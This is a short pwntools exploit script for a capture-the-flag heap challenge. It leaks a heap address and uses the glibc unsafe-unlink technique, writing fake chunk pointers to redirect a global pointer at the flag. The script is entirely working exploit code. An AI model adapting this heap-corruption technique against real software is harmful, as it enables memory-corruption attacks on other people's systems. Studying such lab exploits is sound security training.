# unsafe_unlink, point to flag

from pwn import *

malloc_size = 1056
guard_size = 1056
trigger_size = 1104

context.arch = 'amd64'

p = process("/challenge/toddlerheap_level5.0")

def heap_leak():
    p.sendline(f"malloc 0 {malloc_size}")
    p.sendline(f"malloc 1 {guard_size}")
    p.sendline(f"free 0")
    p.sendline(f"malloc 2 {trigger_size}")
    p.sendline(f"malloc 0 {malloc_size}")
    p.sendline(b"read 0 16")
    p.send(b"A"*16)
    print(p.clean())
    p.sendline(b"puts 0")
    p.recvuntil(b"A"*16)
    leak = p.recvuntil(b"\n")[:-1]
    leak = unpack(leak, 'all')
    # we can go straight to unsafe_unlink because 0 and 1 is not free'd
    return leak


def unsafe_unlink(chunk_size:int, chunk0_ptr_loc:int):
    # already have chunk_0 and chunk_1
    dummy = p64(0)
    dummy_to_next_chunk = b'\x00' * (chunk_size - 16 - 32)
    payload = dummy + p64(chunk_size + 1 - 0x10) + p64(chunk0_ptr_loc - 24) + p64(chunk0_ptr_loc - 16) + dummy_to_next_chunk + p64(malloc_size) + p64(malloc_size+0x10)
    p.sendline(f"read 0 {chunk_size}")
    p.send(payload)
    p.sendline(b'free 1')
    payload = dummy + p64(chunk_size + 1 - 0x10) + p64(chunk0_ptr_loc - 24) + p64(flag_addr)
    p.sendline(b"read 0 32")
    p.send(payload)


heap_leak_to_flag_offset = 0x530

heap_leak = heap_leak()
print(f'heap_leak = {hex(heap_leak)}')
flag_addr = heap_leak - heap_leak_to_flag_offset
chunk0_ptr = heap_leak + 0x10
chunk0_ptr_loc = 0x404140

unsafe_unlink(malloc_size + 16, chunk0_ptr_loc)

p.interactive()
